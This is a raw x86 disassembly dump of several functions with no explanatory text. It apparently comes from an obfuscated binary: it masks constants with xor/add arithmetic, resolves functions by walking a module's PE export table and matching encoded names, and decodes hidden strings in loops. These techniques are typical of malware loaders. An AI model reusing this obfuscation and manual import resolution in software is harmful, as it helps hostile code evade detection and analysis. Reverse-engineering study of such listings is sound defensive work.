  418e57:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  418e5e:	mov    eax,DWORD PTR [ebp-0x14]
  418e61:	xor    eax,0x751089b
  418e66:	add    eax,0x3272e2
  418e6b:	mov    DWORD PTR [ebp-0x8],eax
  418e6e:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  418e75:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  418e7c:	mov    DWORD PTR [ebp-0x4],0xf89c85bb
  418e83:	mov    eax,DWORD PTR [ebp-0x14]
  418e86:	xor    eax,0x751089b
  418e8b:	mov    ecx,DWORD PTR [ebp-0x8]
  418e8e:	lea    eax,[ecx+eax*1+0x3272e2]
  418e95:	mov    ecx,DWORD PTR [ebp-0x18]
  418e98:	xor    ecx,0x751089b
  418e9e:	add    ecx,0x3272e2
  418ea4:	mov    edx,DWORD PTR [ebp+0x10]
  418ea7:	imul   edx,ecx
  418eaa:	cmp    eax,edx
  418eac:	jae    0x418f9f
  418eb2:	mov    eax,DWORD PTR [ebp+0x10]
  418eb5:	mov    ecx,DWORD PTR [ebp-0x8]
  418eb8:	sub    eax,ecx
  418eba:	mov    ecx,DWORD PTR [ebp-0x10]
  418ebd:	xor    ecx,0x751089b
  418ec3:	add    ecx,0x3272e2
  418ec9:	cmp    eax,ecx
  418ecb:	jbe    0x418efd
  418ecd:	mov    eax,DWORD PTR [ebp+0x8]
  418ed0:	add    eax,DWORD PTR [ebp-0x8]
  418ed3:	mov    ecx,DWORD PTR [ebp+0xc]
  418ed6:	add    ecx,DWORD PTR [ebp-0x8]
  418ed9:	mov    edx,DWORD PTR [ecx]
  418edb:	mov    DWORD PTR [eax],edx
  418edd:	mov    ecx,DWORD PTR [ecx+0x4]
  418ee0:	mov    DWORD PTR [eax+0x4],ecx
  418ee3:	mov    eax,DWORD PTR [ebp-0x10]
  418ee6:	xor    eax,0x751089b
  418eeb:	mov    ecx,DWORD PTR [ebp-0x8]
  418eee:	lea    eax,[ecx+eax*1+0x3272e2]
  418ef5:	mov    DWORD PTR [ebp-0x8],eax
  418ef8:	jmp    0x418f9a
  418efd:	mov    eax,DWORD PTR [ebp+0x10]
  418f00:	mov    ecx,DWORD PTR [ebp-0x8]
  418f03:	sub    eax,ecx
  418f05:	mov    ecx,DWORD PTR [ebp-0xc]
  418f08:	xor    ecx,0x751089b
  418f0e:	add    ecx,0x3272e2
  418f14:	cmp    eax,ecx
  418f16:	jbe    0x418f3f
  418f18:	mov    eax,DWORD PTR [ebp+0x8]
  418f1b:	add    eax,DWORD PTR [ebp-0x8]
  418f1e:	mov    ecx,DWORD PTR [ebp+0xc]
  418f21:	add    ecx,DWORD PTR [ebp-0x8]
  418f24:	mov    ecx,DWORD PTR [ecx]
  418f26:	mov    DWORD PTR [eax],ecx
  418f28:	mov    eax,DWORD PTR [ebp-0xc]
  418f2b:	xor    eax,0x751089b
  418f30:	mov    ecx,DWORD PTR [ebp-0x8]
  418f33:	lea    eax,[ecx+eax*1+0x3272e2]
  418f3a:	mov    DWORD PTR [ebp-0x8],eax
  418f3d:	jmp    0x418f9a
  418f3f:	mov    eax,DWORD PTR [ebp+0x10]
  418f42:	mov    ecx,DWORD PTR [ebp-0x8]
  418f45:	sub    eax,ecx
  418f47:	mov    ecx,DWORD PTR [ebp-0x4]
  418f4a:	xor    ecx,0x751089b
  418f50:	add    ecx,0x3272e2
  418f56:	cmp    eax,ecx
  418f58:	jbe    0x418f83
  418f5a:	mov    eax,DWORD PTR [ebp+0x8]
  418f5d:	add    eax,DWORD PTR [ebp-0x8]
  418f60:	mov    ecx,DWORD PTR [ebp+0xc]
  418f63:	add    ecx,DWORD PTR [ebp-0x8]
  418f66:	mov    cx,WORD PTR [ecx]
  418f69:	mov    WORD PTR [eax],cx
  418f6c:	mov    eax,DWORD PTR [ebp-0x4]
  418f6f:	xor    eax,0x751089b
  418f74:	mov    ecx,DWORD PTR [ebp-0x8]
  418f77:	lea    eax,[ecx+eax*1+0x3272e2]
  418f7e:	mov    DWORD PTR [ebp-0x8],eax
  418f81:	jmp    0x418f9a
  418f83:	mov    eax,DWORD PTR [ebp+0x8]
  418f86:	add    eax,DWORD PTR [ebp-0x8]
  418f89:	mov    ecx,DWORD PTR [ebp+0xc]
  418f8c:	add    ecx,DWORD PTR [ebp-0x8]
  418f8f:	mov    cl,BYTE PTR [ecx]
  418f91:	mov    BYTE PTR [eax],cl
  418f93:	mov    eax,DWORD PTR [ebp-0x8]
  418f96:	inc    eax
  418f97:	mov    DWORD PTR [ebp-0x8],eax
  418f9a:	jmp    0x418e83
  418f9f:	leave  
  418fa0:	ret    0xc
  418fa3:	push   ebp
  418fa4:	mov    ebp,esp
  418fa6:	sub    esp,0xc
  418fa9:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  418fb0:	push   esi
  418fb1:	mov    esi,eax
  418fb3:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  418fba:	mov    edx,DWORD PTR [ebp-0x4]
  418fbd:	mov    eax,0x751089b
  418fc2:	xor    edx,eax
  418fc4:	mov    ecx,0x3272e2
  418fc9:	add    edx,ecx
  418fcb:	cmp    esi,edx
  418fcd:	je     0x41900f
  418fcf:	push   ebx
  418fd0:	push   edi
  418fd1:	mov    edx,DWORD PTR [ebp-0x8]
  418fd4:	mov    ebx,DWORD PTR [ebp+0x8]
  418fd7:	xor    edx,eax
  418fd9:	mov    edi,0xffcd8d1e
  418fde:	sub    edi,edx
  418fe0:	add    esi,edi
  418fe2:	lea    edx,[esi-0x3272e2]
  418fe8:	xor    edx,eax
  418fea:	mov    DWORD PTR [ebp-0xc],edx
  418fed:	mov    edx,DWORD PTR [ebp-0x4]
  418ff0:	mov    edi,DWORD PTR [ebp-0xc]
  418ff3:	xor    dl,0x9b
  418ff6:	sub    dl,0x1e
  418ff9:	xor    edi,eax
  418ffb:	mov    BYTE PTR [edi+ebx*1+0x3272e2],dl
  419002:	mov    edx,DWORD PTR [ebp-0x4]
  419005:	xor    edx,eax
  419007:	add    edx,ecx
  419009:	cmp    esi,edx
  41900b:	jne    0x418fd1
  41900d:	pop    edi
  41900e:	pop    ebx
  41900f:	pop    esi
  419010:	leave  
  419011:	ret    0x4
  419014:	push   ebp
  419015:	mov    ebp,esp
  419017:	sub    esp,0x21c
  41901d:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  419024:	mov    DWORD PTR [ebp-0x14],0xf89c8584
  41902b:	mov    eax,DWORD PTR [ebp+0x10]
  41902e:	mov    eax,DWORD PTR [ebp-0x4]
  419031:	mov    ecx,DWORD PTR [ebp+0x8]
  419034:	push   esi
  419035:	push   edi
  419036:	mov    edi,0x751089b
  41903b:	xor    eax,edi
  41903d:	mov    esi,0x3272e2
  419042:	add    eax,esi
  419044:	cmp    eax,ecx
  419046:	mov    eax,DWORD PTR [ebp-0x4]
  419049:	jne    0x419054
  41904b:	xor    eax,edi
  41904d:	add    eax,esi
  41904f:	jmp    0x419100
  419054:	mov    ecx,DWORD PTR [ebp+0xc]
  419057:	xor    eax,edi
  419059:	add    eax,esi
  41905b:	cmp    eax,ecx
  41905d:	jne    0x419064
  41905f:	mov    eax,DWORD PTR [ebp-0x4]
  419062:	jmp    0x41904b
  419064:	lea    eax,[ebp-0x21c]
  41906a:	mov    DWORD PTR [ebp-0x8],eax
  41906d:	mov    eax,DWORD PTR [ebp+0xc]
  419070:	mov    DWORD PTR [ebp-0x10],eax
  419073:	mov    eax,DWORD PTR [ebp-0x4]
  419076:	xor    eax,edi
  419078:	add    eax,esi
  41907a:	mov    DWORD PTR [ebp+0x10],eax
  41907d:	mov    eax,DWORD PTR [ebp+0xc]
  419080:	push   ebx
  419081:	call   0x418d5c
  419086:	mov    ebx,eax
  419088:	mov    eax,DWORD PTR [ebp+0x8]
  41908b:	mov    eax,DWORD PTR [eax+0x14]
  41908e:	jmp    0x4190e8
  419090:	mov    eax,DWORD PTR [ebp+0xc]
  419093:	sub    eax,0x8
  419096:	mov    DWORD PTR [ebp-0xc],eax
  419099:	mov    eax,DWORD PTR [ebp-0xc]
  41909c:	mov    eax,DWORD PTR [eax+0x28]
  41909f:	call   0x418c44
  4190a4:	mov    DWORD PTR [ebp+0x10],eax
  4190a7:	push   DWORD PTR [ebp+0x10]
  4190aa:	mov    edx,DWORD PTR [ebp-0x8]
  4190ad:	call   0x418deb
  4190b2:	mov    eax,DWORD PTR [ebp-0x4]
  4190b5:	xor    eax,edi
  4190b7:	add    eax,esi
  4190b9:	cmp    eax,ebx
  4190bb:	jne    0x4190c5
  4190bd:	mov    eax,DWORD PTR [ebp-0x8]
  4190c0:	call   0x418cd2
  4190c5:	mov    eax,DWORD PTR [ebp-0x14]
  4190c8:	xor    eax,edi
  4190ca:	add    eax,esi
  4190cc:	push   eax
  4190cd:	push   DWORD PTR [ebp-0x10]
  4190d0:	mov    eax,DWORD PTR [ebp-0x8]
  4190d3:	call   0x4189fe
  4190d8:	mov    ecx,DWORD PTR [ebp-0x4]
  4190db:	xor    ecx,edi
  4190dd:	add    ecx,esi
  4190df:	cmp    eax,ecx
  4190e1:	je     0x419106
  4190e3:	mov    eax,DWORD PTR [ebp+0xc]
  4190e6:	mov    eax,DWORD PTR [eax]
  4190e8:	mov    DWORD PTR [ebp+0xc],eax
  4190eb:	mov    eax,DWORD PTR [ebp+0x8]
  4190ee:	mov    ecx,DWORD PTR [ebp+0xc]
  4190f1:	add    eax,0x14
  4190f4:	cmp    ecx,eax
  4190f6:	jne    0x419090
  4190f8:	mov    eax,DWORD PTR [ebp-0x4]
  4190fb:	xor    eax,edi
  4190fd:	add    eax,esi
  4190ff:	pop    ebx
  419100:	pop    edi
  419101:	pop    esi
  419102:	leave  
  419103:	ret    0xc
  419106:	mov    eax,DWORD PTR [ebp-0xc]
  419109:	mov    eax,DWORD PTR [eax+0x18]
  41910c:	jmp    0x4190ff
  41910e:	push   ebp
  41910f:	mov    ebp,esp
  419111:	mov    eax,DWORD PTR [ebp+0xc]
  419114:	sub    esp,0x10
  419117:	cmp    DWORD PTR [ebp+0x8],0x0
  41911b:	push   ebx
  41911c:	push   esi
  41911d:	push   edi
  41911e:	je     0x4191d3
  419124:	test   eax,eax
  419126:	je     0x4191d3
  41912c:	movzx  eax,WORD PTR [eax+0x20]
  419130:	mov    ecx,eax
  419132:	mov    DWORD PTR [ebp-0x10],eax
  419135:	xor    edx,edx
  419137:	and    DWORD PTR [ebp-0x8],edx
  41913a:	mov    eax,0x8a8d
  41913f:	xor    ecx,eax
  419141:	add    ecx,0x3b51
  419147:	mov    DWORD PTR [ebp-0xc],ecx
  41914a:	and    DWORD PTR [ebp-0x4],0x0
  41914e:	xor    ecx,ecx
  419150:	push   0x7e
  419152:	pop    edi
  419153:	cmp    cx,WORD PTR [ebp-0xc]
  419157:	jae    0x4191bd
  419159:	lea    esi,[edx-0x3b51]
  41915f:	xor    esi,eax
  419161:	movzx  ecx,WORD PTR [ebp-0x4]
  419165:	mov    ebx,DWORD PTR [ebp+0xc]
  419168:	lea    ecx,[ebx+ecx*4]
  41916b:	cmp    WORD PTR [ecx+0x2],si
  41916f:	jne    0x4191a8
  419171:	movzx  ecx,WORD PTR [ecx]
  419174:	mov    edi,0x4e22
  419179:	cmp    cx,di
  41917c:	jne    0x41918a
  41917e:	mov    ebx,DWORD PTR [ebp+0x8]
  419181:	movzx  edi,dx
  419184:	cmp    BYTE PTR [edi+ebx*1],0x0
  419188:	je     0x4191b7
  41918a:	mov    ebx,DWORD PTR [ebp+0x8]
  41918d:	movzx  edi,dx
  419190:	movsx  di,BYTE PTR [edi+ebx*1]
  419195:	mov    ebx,0x3b51
  41919a:	sub    di,bx
  41919d:	xor    di,ax
  4191a0:	cmp    cx,di
  4191a3:	je     0x4191b7
  4191a5:	push   0x7c
  4191a7:	pop    edi
  4191a8:	inc    DWORD PTR [ebp-0x4]
  4191ab:	mov    cx,WORD PTR [ebp-0xc]
  4191af:	cmp    WORD PTR [ebp-0x4],cx
  4191b3:	jb     0x419161
  4191b5:	jmp    0x4191bd
  4191b7:	inc    DWORD PTR [ebp-0x8]
  4191ba:	push   0x7d
  4191bc:	pop    edi
  4191bd:	mov    esi,DWORD PTR [ebp+0x8]
  4191c0:	movzx  ecx,dx
  4191c3:	cmp    BYTE PTR [ecx+esi*1],0x0
  4191c7:	je     0x4191dc
  4191c9:	inc    edx
  4191ca:	cmp    edi,0x7c
  4191cd:	jne    0x41914a
  4191d3:	xor    eax,eax
  4191d5:	pop    edi
  4191d6:	pop    esi
  4191d7:	pop    ebx
  4191d8:	leave  
  4191d9:	ret    0x8
  4191dc:	mov    ecx,DWORD PTR [ebp-0x8]
  4191df:	add    ecx,0xffffc4af
  4191e5:	xor    cx,ax
  4191e8:	xor    eax,eax
  4191ea:	cmp    cx,WORD PTR [ebp-0x10]
  4191ee:	sete   al
  4191f1:	jmp    0x4191d5
  4191f3:	push   ebp
  4191f4:	mov    ebp,esp
  4191f6:	sub    esp,0x50
  4191f9:	push   edi
  4191fa:	mov    edi,eax
  4191fc:	mov    eax,DWORD PTR [edi+0x1a8]
  419202:	cmp    DWORD PTR [eax],0x0
  419205:	jne    0x41920e
  419207:	xor    eax,eax
  419209:	jmp    0x41933f
  41920e:	push   DWORD PTR [ebp+0x8]
  419211:	push   0x2c
  419213:	pop    eax
  419214:	call   0x418fa3
  419219:	mov    edx,DWORD PTR [edi+0x1ac]
  41921f:	lea    eax,[edi+0x22]
  419222:	mov    DWORD PTR [ebp-0x4c],eax
  419225:	lea    eax,[edi+0x44]
  419228:	mov    DWORD PTR [ebp-0x48],eax
  41922b:	lea    eax,[edi+0x66]
  41922e:	mov    DWORD PTR [ebp-0x44],eax
  419231:	lea    eax,[edi+0x88]
  419237:	mov    DWORD PTR [ebp-0x40],eax
  41923a:	lea    eax,[edi+0xaa]
  419240:	mov    DWORD PTR [ebp-0x3c],eax
  419243:	lea    eax,[edi+0xcc]
  419249:	mov    DWORD PTR [ebp-0x38],eax
  41924c:	lea    eax,[edi+0xee]
  419252:	mov    DWORD PTR [ebp-0x34],eax
  419255:	lea    eax,[edi+0x110]
  41925b:	mov    DWORD PTR [ebp-0x30],eax
  41925e:	lea    eax,[edi+0x132]
  419264:	mov    DWORD PTR [ebp-0x2c],eax
  419267:	lea    eax,[edi+0x154]
  41926d:	push   edi
  41926e:	mov    DWORD PTR [ebp-0x50],edi
  419271:	mov    DWORD PTR [ebp-0x28],eax
  419274:	call   0x419373
  419279:	push   eax
  41927a:	mov    eax,DWORD PTR [edi+0x1a8]
  419280:	push   DWORD PTR [eax]
  419282:	call   0x419014
  419287:	mov    DWORD PTR [ebp-0x10],eax
  41928a:	test   eax,eax
  41928c:	je     0x41933f
  419292:	mov    ecx,DWORD PTR [eax+0x3c]
  419295:	push   ebx
  419296:	push   esi
  419297:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  41929b:	add    esi,eax
  41929d:	mov    edi,DWORD PTR [esi+0x24]
  4192a0:	mov    ecx,DWORD PTR [esi+0x1c]
  4192a3:	mov    edx,DWORD PTR [esi+0x20]
  4192a6:	mov    ebx,DWORD PTR [esi+0x18]
  4192a9:	add    edi,eax
  4192ab:	mov    DWORD PTR [ebp-0x20],edi
  4192ae:	mov    edi,DWORD PTR [esi+0x14]
  4192b1:	add    ecx,eax
  4192b3:	add    edx,eax
  4192b5:	mov    DWORD PTR [ebp-0xc],ecx
  4192b8:	mov    DWORD PTR [ebp-0x1c],edx
  4192bb:	mov    DWORD PTR [ebp-0x8],edi
  4192be:	cmp    edi,ebx
  4192c0:	ja     0x4192c5
  4192c2:	mov    DWORD PTR [ebp-0x8],ebx
  4192c5:	xor    ebx,ebx
  4192c7:	mov    DWORD PTR [ebp-0x18],ebx
  4192ca:	cmp    DWORD PTR [ebp-0x8],ebx
  4192cd:	jbe    0x41933d
  4192cf:	jmp    0x4192d4
  4192d1:	mov    edx,DWORD PTR [ebp-0x1c]
  4192d4:	mov    edi,DWORD PTR [ebp-0x20]
  4192d7:	movzx  edi,WORD PTR [edi+ebx*2]
  4192db:	cmp    ebx,DWORD PTR [esi+0x18]
  4192de:	jae    0x41933d
  4192e0:	cmp    edi,DWORD PTR [esi+0x14]
  4192e3:	jae    0x41933d
  4192e5:	mov    ebx,DWORD PTR [edx+ebx*4]
  4192e8:	mov    edx,DWORD PTR [ebp+0x8]
  4192eb:	mov    edi,DWORD PTR [ecx+edi*4]
  4192ee:	mov    DWORD PTR [ebp-0x4],edx
  4192f1:	lea    edx,[ebp-0x50]
  4192f4:	add    ebx,eax
  4192f6:	add    edi,eax
  4192f8:	sub    edx,DWORD PTR [ebp+0x8]
  4192fb:	mov    DWORD PTR [ebp-0x14],0xb
  419302:	mov    DWORD PTR [ebp-0x24],edx
  419305:	mov    edx,DWORD PTR [ebp-0x4]
  419308:	cmp    DWORD PTR [edx],0x0
  41930b:	jne    0x419328
  41930d:	mov    eax,DWORD PTR [ebp-0x24]
  419310:	push   DWORD PTR [eax+edx*1]
  419313:	push   ebx
  419314:	call   0x41910e
  419319:	mov    ecx,DWORD PTR [ebp-0xc]
  41931c:	test   eax,eax
  41931e:	je     0x419325
  419320:	mov    eax,DWORD PTR [ebp-0x4]
  419323:	mov    DWORD PTR [eax],edi
  419325:	mov    eax,DWORD PTR [ebp-0x10]
  419328:	add    DWORD PTR [ebp-0x4],0x4
  41932c:	dec    DWORD PTR [ebp-0x14]
  41932f:	jne    0x419305
  419331:	mov    ebx,DWORD PTR [ebp-0x18]
  419334:	inc    ebx
  419335:	mov    DWORD PTR [ebp-0x18],ebx
  419338:	cmp    ebx,DWORD PTR [ebp-0x8]
  41933b:	jb     0x4192d1
  41933d:	pop    esi
  41933e:	pop    ebx
  41933f:	pop    edi
  419340:	leave  
  419341:	ret    0x4
  419344:	push   ebp
  419345:	mov    ebp,esp
  419347:	mov    eax,DWORD PTR [ebp+0x8]
  41934a:	push   esi
  41934b:	push   DWORD PTR [eax+0x1d8]
  419351:	lea    esi,[eax+0x198]
  419357:	mov    eax,DWORD PTR [ebp+0x8]
  41935a:	call   0x4191f3
  41935f:	mov    ecx,DWORD PTR [esi]
  419361:	mov    DWORD PTR [ecx],eax
  419363:	mov    eax,DWORD PTR [esi]
  419365:	xor    ecx,ecx
  419367:	cmp    DWORD PTR [eax],ecx
  419369:	pop    esi
  41936a:	setne  cl
  41936d:	mov    eax,ecx
  41936f:	pop    ebp
  419370:	ret    0x4
  419373:	mov    ecx,DWORD PTR [edi+0x188]
  419379:	push   ebx
  41937a:	jmp    0x41938f
  41937c:	xor    eax,0x8a8d
  419381:	add    eax,0x3b51
  419386:	mov    WORD PTR [ecx],ax
  419389:	add    ecx,0x2
  41938c:	add    edx,0x2
  41938f:	movzx  eax,WORD PTR [edx]
  419392:	mov    ebx,0x4e22
  419397:	cmp    ax,bx
  41939a:	jne    0x41937c
  41939c:	xor    eax,eax
  41939e:	mov    WORD PTR [ecx],ax
  4193a1:	mov    eax,DWORD PTR [edi+0x188]
  4193a7:	pop    ebx
  4193a8:	ret    
  4193a9:	push   edi
  4193aa:	mov    edi,eax
  4193ac:	mov    eax,DWORD PTR [esi+0x188]
  4193b2:	shl    edi,0x6
  4193b5:	add    eax,edi
  4193b7:	jmp    0x4193c3
  4193b9:	xor    cl,0x74
  4193bc:	sub    cl,0x8
  4193bf:	mov    BYTE PTR [eax],cl
  4193c1:	inc    eax
  4193c2:	inc    edx
  4193c3:	mov    cl,BYTE PTR [edx]
  4193c5:	cmp    cl,0x7c
  4193c8:	jne    0x4193b9
  4193ca:	mov    BYTE PTR [eax],0x0
  4193cd:	mov    eax,DWORD PTR [esi+0x188]
  4193d3:	add    eax,edi
  4193d5:	pop    edi
  4193d6:	ret    
  4193d7:	push   ebp
  4193d8:	mov    ebp,esp
  4193da:	sub    esp,0x38
  4193dd:	push   ebx
  4193de:	mov    ebx,0xf89c8585
  4193e3:	mov    DWORD PTR [ebp-0x4],ebx
  4193e6:	lea    eax,[ebx-0x1]
  4193e9:	push   esi
  4193ea:	mov    DWORD PTR [ebp-0x24],eax
  4193ed:	mov    ecx,DWORD PTR [ebp-0x4]
  4193f0:	mov    edx,DWORD PTR [ebp+0x8]
  4193f3:	mov    esi,0x751089b
  4193f8:	push   edi
  4193f9:	xor    ecx,esi
  4193fb:	mov    edi,0x3272e2
  419400:	add    ecx,edi
  419402:	cmp    edx,ecx
  419404:	je     0x419572
  41940a:	mov    ecx,DWORD PTR [ebp-0x4]
  41940d:	mov    edx,DWORD PTR [ebp+0xc]
  419410:	xor    ecx,esi
  419412:	add    ecx,edi
  419414:	cmp    edx,ecx
  419416:	je     0x419572
  41941c:	mov    ecx,DWORD PTR [ebp+0x10]
  41941f:	mov    DWORD PTR [ebp-0x18],ecx
  419422:	mov    ecx,DWORD PTR [ebp+0xc]
  419425:	mov    DWORD PTR [ebp-0x14],ecx
  419428:	mov    ecx,DWORD PTR [ebp+0x8]
  41942b:	mov    DWORD PTR [ebp-0x1c],0xf89c8507
  419432:	mov    DWORD PTR [ebp-0x20],eax
  419435:	mov    DWORD PTR [ebp-0x10],ebx
  419438:	mov    DWORD PTR [ebp+0xc],eax
  41943b:	mov    DWORD PTR [ebp+0x10],0xf89c85bb
  419442:	mov    eax,DWORD PTR [ebp+0xc]
  419445:	mov    DWORD PTR [ebp-0xc],ecx
  419448:	xor    eax,esi
  41944a:	mov    ecx,0xffcd8d1e
  41944f:	sub    ecx,eax
  419451:	add    ecx,DWORD PTR [ebp-0x14]
  419454:	mov    DWORD PTR [ebp+0x8],ecx
  419457:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41945e:	jmp    0x419562
  419463:	mov    eax,DWORD PTR [ebp+0xc]
  419466:	mov    ecx,DWORD PTR [ebp+0xc]
  419469:	xor    eax,esi
  41946b:	xor    ecx,esi
  41946d:	lea    ecx,[eax+ecx*1+0x64e5c4]
  419474:	mov    eax,DWORD PTR [ebp+0x8]
  419477:	xor    edx,edx
  419479:	div    ecx
  41947b:	mov    eax,DWORD PTR [ebp+0x10]
  41947e:	mov    ecx,DWORD PTR [ebp+0xc]
  419481:	xor    eax,esi
  419483:	xor    ecx,esi
  419485:	sub    eax,ecx
  419487:	cmp    edx,eax
  419489:	jne    0x41951e
  41948f:	mov    eax,DWORD PTR [ebp+0x8]
  419492:	add    eax,DWORD PTR [ebp-0xc]
  419495:	mov    dl,BYTE PTR [eax]
  419497:	mov    eax,DWORD PTR [ebp-0x10]
  41949a:	mov    ecx,DWORD PTR [ebp-0x8]
  41949d:	xor    eax,esi
  41949f:	xor    ecx,esi
  4194a1:	add    eax,edi
  4194a3:	add    ecx,edi
  4194a5:	cmp    eax,ecx
  4194a7:	jae    0x4194ef
  4194a9:	lea    ecx,[eax-0x3272e2]
  4194af:	mov    DWORD PTR [ebp-0x4],ecx
  4194b2:	mov    ebx,DWORD PTR [ebp-0x4]
  4194b5:	xor    ebx,esi
  4194b7:	add    ebx,0x7f55d8fb
  4194bd:	lea    ecx,[ebp+eax*4-0x38]
  4194c1:	mov    DWORD PTR [ecx],ebx
  4194c3:	mov    ebx,DWORD PTR [ecx]
  4194c5:	cmp    ebx,0x244ecbda
  4194cb:	jbe    0x4194d5
  4194cd:	add    DWORD PTR [ecx],0x405fc19
  4194d3:	jmp    0x4194db
  4194d5:	add    DWORD PTR [ecx],0xfdaf43e7
  4194db:	mov    ecx,DWORD PTR [ebp-0x8]
  4194de:	xor    ecx,esi
  4194e0:	inc    eax
  4194e1:	inc    DWORD PTR [ebp-0x4]
  4194e4:	add    ecx,edi
  4194e6:	cmp    eax,ecx
  4194e8:	jb     0x4194b2
  4194ea:	mov    ebx,0xf89c8585
  4194ef:	mov    eax,DWORD PTR [ebp-0x18]
  4194f2:	test   eax,eax
  4194f4:	jne    0x4194fe
  4194f6:	xor    dl,0x74
  4194f9:	sub    dl,0x8
  4194fc:	jmp    0x419514
  4194fe:	mov    eax,DWORD PTR [ebp-0x1c]
  419501:	xor    al,0x9b
  419503:	mov    cl,0x1e
  419505:	sub    cl,al
  419507:	add    dl,cl
  419509:	mov    ecx,DWORD PTR [ebp-0x20]
  41950c:	xor    cl,0x9b
  41950f:	sub    cl,0x1e
  419512:	ror    dl,cl
  419514:	xor    eax,eax
  419516:	mov    eax,DWORD PTR [ebp+0x8]
  419519:	add    eax,DWORD PTR [ebp-0xc]
  41951c:	mov    BYTE PTR [eax],dl
  41951e:	mov    eax,DWORD PTR [ebp+0x8]
  419521:	mov    ecx,DWORD PTR [ebp-0x10]
  419524:	sub    eax,edi
  419526:	xor    eax,esi
  419528:	cmp    eax,ecx
  41952a:	jne    0x419550
  41952c:	mov    eax,DWORD PTR [ebp+0x10]
  41952f:	mov    ecx,DWORD PTR [ebp+0xc]
  419532:	xor    eax,esi
  419534:	xor    ecx,esi
  419536:	sub    eax,ecx
  419538:	sub    eax,edi
  41953a:	xor    eax,esi
  41953c:	mov    DWORD PTR [ebp+0x10],eax
  41953f:	mov    eax,DWORD PTR [ebp+0xc]
  419542:	xor    eax,esi
  419544:	mov    ecx,0xffcd8d1e
  419549:	sub    ecx,eax
  41954b:	add    ecx,DWORD PTR [ebp-0x14]
  41954e:	jmp    0x41955f
  419550:	mov    eax,DWORD PTR [ebp+0xc]
  419553:	xor    eax,esi
  419555:	mov    ecx,0xffcd8d1e
  41955a:	sub    ecx,eax
  41955c:	add    ecx,DWORD PTR [ebp+0x8]
  41955f:	mov    DWORD PTR [ebp+0x8],ecx
  419562:	mov    eax,DWORD PTR [ebp+0x10]
  419565:	cmp    eax,ebx
  419567:	jne    0x419463
  41956d:	mov    eax,DWORD PTR [ebp-0x24]
  419570:	jmp    0x419575
  419572:	mov    eax,DWORD PTR [ebp-0x4]
  419575:	xor    eax,esi
  419577:	add    eax,edi
  419579:	pop    edi
  41957a:	pop    esi
  41957b:	pop    ebx
  41957c:	leave  
  41957d:	ret    0xc
  419580:	push   ebp
  419581:	mov    ebp,esp
  419583:	sub    esp,0x14
  419586:	mov    DWORD PTR [ebp-0x10],0xf89c8585
  41958d:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  419594:	mov    eax,DWORD PTR [ebx]
  419596:	mov    DWORD PTR [ebp-0x8],eax
  419599:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4195a0:	push   esi
  4195a1:	push   edi
  4195a2:	mov    DWORD PTR [ebp-0x14],0xead718a5
  4195a9:	mov    edi,DWORD PTR [ebp-0x4]
  4195ac:	mov    ecx,DWORD PTR [ebp-0x10]
  4195af:	mov    eax,0x751089b
  4195b4:	xor    edi,eax
  4195b6:	mov    edx,0x3272e2
  4195bb:	xor    ecx,eax
  4195bd:	add    edi,edx
  4195bf:	add    ecx,edx
  4195c1:	imul   edi,ecx
  4195c4:	jmp    0x41960c
  4195c6:	mov    ecx,DWORD PTR [ebp-0x8]
  4195c9:	mov    esi,DWORD PTR [ebp-0x4]
  4195cc:	xor    ecx,eax
  4195ce:	xor    esi,eax
  4195d0:	add    ecx,edx
  4195d2:	add    esi,edx
  4195d4:	test   esi,ecx
  4195d6:	mov    esi,DWORD PTR [ebp-0x8]
  4195d9:	mov    ecx,DWORD PTR [ebp-0x4]
  4195dc:	je     0x4195f3
  4195de:	xor    ecx,eax
  4195e0:	xor    esi,eax
  4195e2:	add    ecx,edx
  4195e4:	add    esi,edx
  4195e6:	shr    esi,cl
  4195e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4195eb:	xor    ecx,eax
  4195ed:	add    ecx,edx
  4195ef:	xor    esi,ecx
  4195f1:	jmp    0x4195fd
  4195f3:	xor    esi,eax
  4195f5:	xor    ecx,eax
  4195f7:	add    esi,edx
  4195f9:	add    ecx,edx
  4195fb:	shr    esi,cl
  4195fd:	mov    DWORD PTR [ebp-0x8],esi
  419600:	mov    ecx,DWORD PTR [ebp-0x4]
  419603:	xor    ecx,eax
  419605:	lea    edi,[edi+ecx*1+0x3272e2]
  41960c:	mov    ecx,DWORD PTR [ebp-0xc]
  41960f:	mov    esi,DWORD PTR [ebp-0x4]
  419612:	xor    esi,eax
  419614:	xor    ecx,eax
  419616:	sub    ecx,esi
  419618:	cmp    edi,ecx
  41961a:	jbe    0x4195c6
  41961c:	mov    eax,DWORD PTR [ebp-0x8]
  41961f:	pop    edi
  419620:	mov    DWORD PTR [ebx],eax
  419622:	mov    eax,DWORD PTR [ebp-0x8]
  419625:	pop    esi
  419626:	leave  
  419627:	ret    
  419628:	push   ebp
  419629:	mov    ebp,esp
  41962b:	sub    esp,0x420
  419631:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  419638:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  41963f:	mov    DWORD PTR [ebp-0x18],0xf89c8685
  419646:	push   ebx
  419647:	mov    DWORD PTR [ebp-0x1c],0xf89c8586
  41964e:	mov    eax,DWORD PTR [ebp-0x14]
  419651:	push   esi
  419652:	mov    esi,0x751089b
  419657:	push   edi
  419658:	xor    eax,esi
  41965a:	mov    edi,0x3272e2
  41965f:	add    eax,edi
  419661:	mov    DWORD PTR [ebp-0x8],eax
  419664:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  41966b:	mov    DWORD PTR [ebp-0x4],0xead718a5
  419672:	mov    DWORD PTR [ebp-0x10],0x8
  419679:	mov    ecx,ecx
  41967b:	mov    eax,DWORD PTR [ebp-0xc]
  41967e:	mov    ecx,DWORD PTR [ebp-0x14]
  419681:	xor    eax,esi
  419683:	xor    ecx,esi
  419685:	add    eax,edi
  419687:	add    ecx,edi
  419689:	imul   eax,ecx
  41968c:	jmp    0x4196bf
  41968e:	mov    eax,DWORD PTR [ebp-0x4]
  419691:	sub    eax,edi
  419693:	xor    eax,esi
  419695:	mov    DWORD PTR [ebp-0x8],eax
